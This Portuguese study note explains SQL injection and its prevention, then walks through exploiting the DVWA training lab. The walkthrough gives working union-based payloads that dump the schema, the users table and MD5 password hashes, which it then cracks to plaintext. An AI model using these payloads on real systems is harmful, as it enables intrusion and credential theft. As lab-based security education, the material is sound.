# SQL Injection

SQL Injection (SQLi) é uma vulnerabilidade que permite a um atacante “injetar” comandos SQL maliciosos em consultas do aplicativo ao banco de dados, quando entradas do usuário (ex.: campos de formulário, parâmetros de URL, cabeçalhos) são concatenadas diretamente na query sem proteção. Com isso, o invasor pode ler, modificar ou apagar dados, contornar autenticação e, em alguns casos, até executar código no servidor do banco.

### Por que acontece

* **Concatenação de strings** para montar queries com dados não confiáveis.
* **Falta de validação/normalização** de entrada.
* **Privilégios excessivos** do usuário de banco usado pela aplicação.
* **Mensagens de erro verbosas** que expõem detalhes da query.

### Tipos comuns

* **In-band (clássico)**
  * *Union-based*: usa `UNION SELECT` para extrair dados.
  * *Error-based*: força erros que revelam informações.
* **Blind (cego)**
  * *Boolean-based*: observa respostas verdadeiro/falso sem ver dados diretos.
  * *Time-based*: usa atrasos (`SLEEP`) para inferir resultados.
* **Out-of-band**: exfiltra dados via canais alternativos (DNS/HTTP externo).

### Como prevenir

1. **Sempre** use **prepared statements/queries parametrizadas** (ou ORM/Query Builder que faça isso por padrão).
2. **Allow-list** para campos dinâmicos (colunas, tabelas, direções de ordenação).
3. **Validação e normalização** de entrada (tipo, tamanho, formato).
4. **Escapar** é paliativo; não substitui parametrização.
5. **Princípio do menor privilégio** no banco (conta somente-leitura quando possível; negar `DROP/ALTER`).
6. **Mensagens de erro genéricas** para o usuário; log detalhado no servidor.
7. **Segredos bem guardados** (variáveis de ambiente, rotation).
8. **Testes e revisão**: SAST/DAST (ex.: análise estática e testes de segurança), casos de teste que verifiquem uso de parâmetros, pipelines CI.
9. **WAF/RAAS** com regras contra SQLi como camada adicional (não substitui correção no código).

### Sinais de alerta & detecção

* Erros de SQL aparecendo para o usuário.
* Respostas inconsistentes ao variar caracteres como `' " ) ; --` ou ao adicionar `OR 1=1`.
* Picos em logs do BD com consultas estranhas.
* Ferramentas de teste (ex.: scanners DAST) apontando entradas não parametrizadas.

---

## In-band

!Imagem

1. Ao inserir um ID (1), a página retorna duas informações: First name: admin e Surname: admin; provavelmente dois campos de uma tabela.

2. Ao inserir ' como ID, é exibido o erro "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1", que é um forte indicativo quea página pode estar sujeita a injeção de SQL.

3. Inferendo que o comando SQL é algo como "SELECT <campos> from <tabela> where <campo> = 'ID Inserido", podemos testar a injeção de um SQL.
 * Colocando o ID como `1' and '1'='1`, a parte condicional será *where <campo> = '1' and '1'='1'*. Considerando que segunda parte da condição é sempre verdadeira, é esperado o retorno do ID = 1. De fato, a página retorna:
   ```
   ID: 1' and '1'='1
   First name: admin
   Surname: admin
   ```
 * Colocando o ID como `1' or '1'='1`, a parte condicional será *where <campo> = '1' or '1'='1'*. Considerando que segunda parte da condição é sempre verdadeira, é esperado o retorno de todos os IDs. De fato, a página retorna:
   ```
   ID: 1' or '1'='1
   First name: admin
   Surname: admin
   
   ID: 1' or '1'='1
   First name: Gordon
   Surname: Brown
   
   ID: 1' or '1'='1
   First name: Hack
   Surname: Me
   
   ID: 1' or '1'='1
   First name: Pablo
   Surname: Picasso
   
   ID: 1' or '1'='1
   First name: Bob
   Surname: Smith
   ```
4. Podemos explorar mais ainda a vunerabilidade para conhecer bancos de dados, tabelas e colunas do servidor SQL.

 * Usando a função database() e user(), que retornam respectivamente o nome do database corrente e 0 nome de usuário e o nome do host fornecidos pelo cliente (`1' union select database(), user() --'`)
  * Como a página espera o retorno de duas informações, são passadas duas funções.
  * Para evitar erro de sintaxe (devido a finalização do comando com "'"), terminamos o comando com um comentário.
   ```
   ID: 1' union select database(), user() --'
   First name: admin
   Surname: admin
   
   ID: 1' union select database(), user() --'
   First name: dvwa
   Surname: 0
   ```
 Da resposta, extraímos que o banco de dados é o "dvwa".
 * Para obter a lista com os bancos de dados, injetamos `1' union select schema_name, 2 from information_schema.schemata -- '`.
  * Inserimos o "2" para satisfazer a necessidade da segunda informação
   ```
   ID: 1' union select schema_name, 2 from information_schema.schemata -- '
   First name: admin
   Surname: admin
   
   ID: 1' union select schema_name, 2 from information_schema.schemata -- '
   First name: information_schema
   Surname: 2
   
   ID: 1' union select schema_name, 2 from information_schema.schemata -- '
   First name: dvwa
   Surname: 2
   
   ID: 1' union select schema_name, 2 from information_schema.schemata -- '
   First name: metasploit
   Surname: 2
   
   ID: 1' union select schema_name, 2 from information_schema.schemata -- '
   First name: mysql
   Surname: 2
   
   ID: 1' union select schema_name, 2 from information_schema.schemata -- '
   First name: owasp10
   Surname: 2
   
   ID: 1' union select schema_name, 2 from information_schema.schemata -- '
   First name: tikiwiki
   Surname: 2
   
   ID: 1' union select schema_name, 2 from information_schema.schemata -- '
   First name: tikiwiki195
   Surname: 2
   ```
 * O banco de dados de nosso interesse é o 'dvwa'. Para obter as tabelas do 'dvwa', injetamos `1' union select table_name, 2 from information_schema.tables where table_schema='dvwa' -- '`.
   ```
   ID: 1' union select table_name, 2 from information_schema.tables where table_schema='dvwa' -- '
   First name: admin
   Surname: admin
   
   ID: 1' union select table_name, 2 from information_schema.tables where table_schema='dvwa' -- '
   First name: guestbook
   Surname: 2
   
   ID: 1' union select table_name, 2 from information_schema.tables where table_schema='dvwa' -- '
   First name: users
   Surname: 2
   ```
 * Estamos interessados na tabela 'users'. Para descobrir as colunas, injetamos `1' union select column_name, column_type from information_schema.columns where table_schema='dvwa' and table_name='users' -- '`.
   ```
   ID: 1' union select column_name, column_type from information_schema.columns where table_schema='dvwa' and table_name='users' -- '
   First name: admin
   Surname: admin
   
   ID: 1' union select column_name, column_type from information_schema.columns where table_schema='dvwa' and table_name='users' -- '
   First name: user_id
   Surname: int(6)
   
   ID: 1' union select column_name, column_type from information_schema.columns where table_schema='dvwa' and table_name='users' -- '
   First name: first_name
   Surname: varchar(15)
   
   ID: 1' union select column_name, column_type from information_schema.columns where table_schema='dvwa' and table_name='users' -- '
   First name: last_name
   Surname: varchar(15)
   
   ID: 1' union select column_name, column_type from information_schema.columns where table_schema='dvwa' and table_name='users' -- '
   First name: user
   Surname: varchar(15)
   
   ID: 1' union select column_name, column_type from information_schema.columns where table_schema='dvwa' and table_name='users' -- '
   First name: password
   Surname: varchar(32)
   
   ID: 1' union select column_name, column_type from information_schema.columns where table_schema='dvwa' and table_name='users' -- '
   First name: avatar
   Surname: varchar(70)
   ```
   As colunas da tabela 'users' são:
   * user_id: int(6)
   * first_name: varchar(15)
   * last_name: varchar(15)
   * user: varchar(15)
   * password: varchar(32)
   * avatar: varchar(70)

5. Com as informações da estrutura da tabela 'users' podemos facilmente obter todas as informações da tabela. Para isto, basta injetar `1' union select concat(user,':',password), concat(last_name,',',first_name) from users -- '`.
  ```
  ID: 1' union select concat(user,':',password), concat(last_name,',',first_name) from users -- '
  First name: admin
  Surname: admin
  
  ID: 1' union select concat(user,':',password), concat(last_name,',',first_name) from users -- '
  First name: admin:5f4dcc3b5aa765d61d8327deb882cf99
  Surname: admin,admin
  
  ID: 1' union select concat(user,':',password), concat(last_name,',',first_name) from users -- '
  First name: gordonb:e99a18c428cb38d5f260853678922e03
  Surname: Brown,Gordon
  
  ID: 1' union select concat(user,':',password), concat(last_name,',',first_name) from users -- '
  First name: 1337:8d3533d75ae2c3966d7e0d4fcc69216b
  Surname: Me,Hack
  
  ID: 1' union select concat(user,':',password), concat(last_name,',',first_name) from users -- '
  First name: pablo:0d107d09f5bbe40cade3de5c71e9e9b7
  Surname: Picasso,Pablo
  
  ID: 1' union select concat(user,':',password), concat(last_name,',',first_name) from users -- '
  First name: smithy:5f4dcc3b5aa765d61d8327deb882cf99
  Surname: Smith,Bob
  ```
 Coletamos 5 usernames e suas senhas (na verdade o hash das senhas)

6. Uma rápida pesquisa de um dos hashs na internet, descobrimos que é um MD5, facilmente quebrado por força bruta.

   | User | Hash | Password |
   |------|------|----------|
   | admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
   | gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
   | 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | charley |
   | pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |
   | smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | password |

### Segurança média

O SQL não usa "**'**", ou seja, é informado um inteiro para a consulta do ID. Se modificarmos ligeiramente a consulta, retirando as aspas, podemos injetar um SQL.

Injeção:`1 or 1=1`
Resposta:
```
ID: 1 or 1=1
First name: admin
Surname: admin

ID: 1 or 1=1
First name: Gordon
Surname: Brown

ID: 1 or 1=1
First name: Hack
Surname: Me

ID: 1 or 1=1
First name: Pablo
Surname: Picasso

ID: 1 or 1=1
First name: Bob
Surname: Smith
```
De forma similar: `1 union select database(), user() --`
Resulta em injeção com sucesso:
```
ID: 1 union select database(), user() --
First name: admin
Surname: admin

ID: 1 union select database(), user() --
First name: dvwa
Surname: root@localhost
```
E assim por diante...

